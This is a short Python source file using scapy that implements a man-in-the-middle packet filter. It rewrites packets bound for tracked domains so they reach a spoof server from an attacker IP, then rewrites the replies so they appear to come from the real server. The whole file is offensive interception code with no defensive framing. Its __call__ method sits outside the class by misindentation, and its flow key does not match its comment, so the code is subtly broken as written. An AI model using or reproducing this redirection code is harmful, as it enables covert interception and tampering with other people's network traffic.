from scapy.all import IP, TCP, UDP
from scapy.layers.inet6 import IPv6

class DomainRedirectFilter:
    def __init__(self, domain_tracker, spoof_ip, attacker_ip, logger=None):
        self.domain_tracker = domain_tracker
        self.attacker_ip = attacker_ip
        self.spoof_ip = spoof_ip
        self.logger = logger

        # (client_ip, client_port, proto) → real_server_ip
        self.flows = {}

    def log(self, msg):
        if self.logger:
            self.logger(msg)

def __call__(self, pkt):
    if not pkt.haslayer(IP):
        return False

    ip = pkt[IP]

    if pkt.haslayer(TCP):
        proto = "TCP"
        l4 = pkt[TCP]
    elif pkt.haslayer(UDP):
        proto = "UDP"
        l4 = pkt[UDP]
    else:
        return False

    sport = l4.sport
    dport = l4.dport

    # ───── CLIENT → REAL SERVER ─────
    if ip.dst in self.domain_tracker.ips_v4:
        # Track flow
        self.flows[(sport, proto)] = (ip.src, ip.dst)

        ip.src = self.attacker_ip 
        ip.dst = self.spoof_ip

        del ip.chksum
        del l4.chksum

        self.log("[MITM] Client → Spoof (SNAT to attacker)")
        return False

    # ───── SPOOF SERVER → ATTACKER ─────
    if ip.src == self.spoof_ip and ip.dst == self.attacker_ip:
        key = (dport, proto)
        if key not in self.flows:
            return False

        client_ip, real_ip = self.flows[key]

        ip.src = real_ip
        ip.dst = client_ip

        del ip.chksum
        del l4.chksum

        self.log("[MITM] Spoof → Client (restored src)")
        return False

    return False